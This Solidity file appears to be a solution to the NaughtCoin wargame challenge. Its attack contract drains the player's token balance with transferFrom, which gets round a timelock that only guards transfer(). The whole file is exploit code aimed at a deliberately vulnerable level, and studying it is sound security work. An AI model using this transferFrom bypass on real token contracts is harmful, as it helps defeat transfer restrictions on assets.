// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address owner, address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function player() external view returns (address);
}

contract NaughtCoinAttack {
    INaughtCoin private naughtCoin;
    address public immutable spender;
    address public immutable player;

    constructor(address _naughtCoinAddress) {
        naughtCoin = INaughtCoin(_naughtCoinAddress);
        spender = address(this);
        player = naughtCoin.player();
    }

    function attack() public {
        uint256 ownerBalance = naughtCoin.balanceOf(player);
        naughtCoin.transferFrom(player, spender, ownerBalance);
    }

    function getBalance() public view returns (uint256) {
        return naughtCoin.balanceOf(player);
    }

    function getAllowance(address _owner, address _spender) public view returns (uint256) {
        return naughtCoin.allowance(_owner, _spender);
    }
}
